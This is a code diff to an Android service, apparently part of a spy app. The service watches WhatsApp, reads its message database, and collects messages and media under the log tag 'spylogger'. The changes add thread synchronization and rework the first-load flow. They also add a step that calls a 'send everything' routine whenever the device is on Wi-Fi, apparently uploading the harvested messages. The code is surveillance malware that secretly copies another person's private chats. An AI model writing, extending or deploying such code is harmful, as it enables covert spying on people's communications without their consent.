@@ -144,7 +144,7 @@ public class WhatsAppService extends Service {
         Utils.whatsObserver.startWatching(); // START OBSERVING
     }
 
-    private void updateTopicos() {
+    private synchronized void updateTopicos() {
         external = new DatabaseHelperExternal(getApplicationContext());
         dbHelper = new DatabaseHelper((getApplicationContext()));
         GenericRawResults<String[]> raws;
@@ -190,7 +190,7 @@ public class WhatsAppService extends Service {
         }
     }
 
-    private void updateMsgs(List<Topico> topicos) {
+    private synchronized void updateMsgs(List<Topico> topicos) {
         GenericRawResults<Object[]> rawResults = null;
         List<Mensagem> mensagens = new ArrayList<>();
         List<Mensagem> mensagensComMidia = new ArrayList<>();
@@ -304,11 +304,8 @@ public class WhatsAppService extends Service {
             }
             Log.i(this.getClass().getSimpleName(), "TERMINOU");
 
-            if (!primeiraVez) {
-                verificaArquivos(mensagensComMidia,1);
-            }else{
-                continuarServicos();
-            }
+            verificaArquivos(mensagensComMidia,1);
+            continuarServicos();
 
         } catch (SQLException e) {
             Log.e("spylogger", e.getMessage());
@@ -323,12 +320,22 @@ public class WhatsAppService extends Service {
     }
 
     private void continuarServicos() {
-        Intent intent = new Intent(Utils.PRIMEIRA_CARGA);
-        intent.putExtra(PrimeiraCarga.MESSENGER,true);
-        sendBroadcast(intent);
+        if(primeiraVez) {
+            primeiraVez = false;
+            Intent intent = new Intent(Utils.PRIMEIRA_CARGA);
+            intent.putExtra(PrimeiraCarga.MESSENGER, true);
+            sendBroadcast(intent);
+        }else{
+            if(NetworkUtil.isWifi(getApplicationContext())) {
+                Utils.enviarTudo(getApplicationContext());
+            }
+        }
     }
 
     private void verificaArquivos(List<Mensagem> mensagens, final int contador) {
+        if(primeiraVez){
+            return;
+        }
         Map<Mensagem, File> arquivos = new HashMap<>();
         final Set<Mensagem> pendentes = new HashSet<>();
         Set<Mensagem> existentes = new HashSet<>();
